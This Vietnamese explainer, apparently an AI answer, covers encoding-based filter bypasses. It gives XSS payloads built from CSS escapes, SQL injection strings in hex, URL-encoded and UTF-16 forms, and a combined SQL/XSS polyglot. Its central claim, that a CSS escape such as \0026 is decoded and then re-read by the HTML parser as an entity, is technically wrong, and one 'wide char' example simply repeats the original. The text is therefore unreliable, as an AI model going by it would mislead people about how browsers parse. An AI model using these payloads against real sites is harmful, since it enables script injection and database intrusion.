Các kết hợp này được gọi chung là **Polyglot Encoding** hoặc cụ thể hơn là **Multi-Layer Encoding Bypass**.

### Các tên gọi chuyên ngành:

1. **Polyglot Payload**  
   - Một payload hoạt động được trong nhiều ngữ cảnh/ngôn ngữ cùng lúc (HTML + CSS trong trường hợp này).
   - Ở đây, `\0026quot;` vừa là CSS escape, vừa tạo ra HTML entity.

2. **Encoding Bypass / Sanitizer Bypass**  
   - Lợi dụng sự khác biệt trong quá trình decode giữa các tầng xử lý.
   - **CSS parser** decode `\0026` → `&`, sau đó **HTML parser** hiểu `&quot;` → `"`.

3. **Context-Sensitive Parsing Exploit**  
   - Khai thác sự khác biệt giữa cách parser của CSS và HTML xử lý cùng một chuỗi.

4. **Character Escape Attack**  
   - Lợi dụng cơ chế escape character (mã thoát) để vượt qua bộ lọc.

### Cơ chế cụ thể trong trường hợp này:
```
[CSS Parser]    →  [HTML Parser]   → Kết quả
\0026 quot;     →  &quot;           → "
(escape hex)       (HTML entity)    (dấu nháy)
```
**Bộ lọc chỉ kiểm tra ở 1 tầng** (ví dụ: tìm `&quot;` trong HTML) nhưng không nhận ra `&` được tạo từ CSS escape.

### Các dạng tương tự:
- `\000026quot;` (thêm leading zeros)
- Sử dụng các HTML entity khác: `\0026#34;`, `\0026#x22;`
- Kết hợp URL encoding: `%26quot;` (trong ngữ cảnh URL)

Trong bảo mật web, đây là kỹ thuật **bypass input sanitization** bằng cách sử dụng **nested encoding** hoặc **multiple encoding layers**.
---

---

---
### 1. **Ví dụ trong XSS (Cross-Site Scripting)**

**Tình huống:** Một website lọc thẻ `<script>` và dấu nháy `"` trong HTML, nhưng cho phép CSS trong thuộc tính `style`.

**Payload bằng CSS Character Escapes:**
```html
<div style='content: "\0026quot;; background: url(\0026quot; onerror=alert(1) \0026quot;);'>
```
Quá trình diễn ra:
1. CSS parser decode: `\0026` → `&`
2. Thành: `content: ""; background: url(" onerror=alert(1) ");`
3. Nếu trang web xử lý không đúng, có thể tạo ra XSS.

**Ví dụ thực tế hơn - chèn JavaScript qua CSS:**
```html
<div style='content: "\0026quot;<img src=x onerror=alert(document.domain)>";'>
```
Sau khi decode CSS → HTML:
```html
<div style='content: "<img src=x onerror=alert(document.domain)>";'>
```
Nếu trình duyệt/renderer không xử lý đúng, có thể thực thi JavaScript.

### 2. **Có thể dùng trong SQL Injection không?**

**Có**, nhưng **hạn chế hơn** vì SQL không có cơ chế decode phức tạp như HTML/CSS. Tuy nhiên, có thể dùng các dạng encoding tương tự:

#### a. **SQL với Unicode/Hex Encoding:**
```sql
-- Thay vì: ' OR 1=1 --
-- Có thể dùng: 0x27204f5220313d31202d2d20 (hex của ' OR 1=1 --)
-- Hoặc: %27%20OR%201%3D1%20-- (URL encoded)
```

#### b. **Double Encoding (Web → SQL):**
Ví dụ website decode URL encoding 2 lần:
```
Input: %2527 (URL encoded của %27, mà %27 là URL encoded của ')
Quá trình:
1. Web server decode: %2527 → %27
2. Ứng dụng decode lần nữa: %27 → '
Kết quả: ' (dấu nháy đơn)
```

#### c. **Charset Bypass:**  
Thay đổi encoding để bypass filter:
```sql
' OR 1=1 -- 
→ Dạng wide char: ' OR 1=1 --
→ Dạng UTF-16: 0x00270020004F005200200031003D00310020002D002D0020
```

#### d. **Polyglot SQL/HTML Injection:**
Khi đầu vào được dùng cả trong SQL và HTML:
```
'; alert(1)--<script>alert(2)</script>
```
Payload này có thể:
1. Đóng câu SQL với `';`
2. Chèn JavaScript cho XSS

### 3. **Ví dụ kết hợp Multi-Context:**

**Tình huống:** Một biến từ URL → SQL → HTML output

```
URL: ?search=%2522%253E%3Cscript%3Ealert(1)%3C/script%3E

Giải mã:
1. %2522 → %22 (URL decode lần 1)
2. %22 → " (URL decode lần 2)
3. Kết quả: "><script>alert(1)</script>

Nếu ứng dụng không lọc đúng, có thể:
- SQL: `WHERE name LIKE '%">...%'`
- HTML output: `<input value='">...'>` → XSS
```


- **Tổng quát:** Decode → Validate → Encode ở đúng tầng, không chỉ filter đơn giản.

**Lưu ý:** Các kỹ thuật này ngày càng khó thực hiện vì modern frameworks đã có cơ chế bảo vệ tốt hơn.
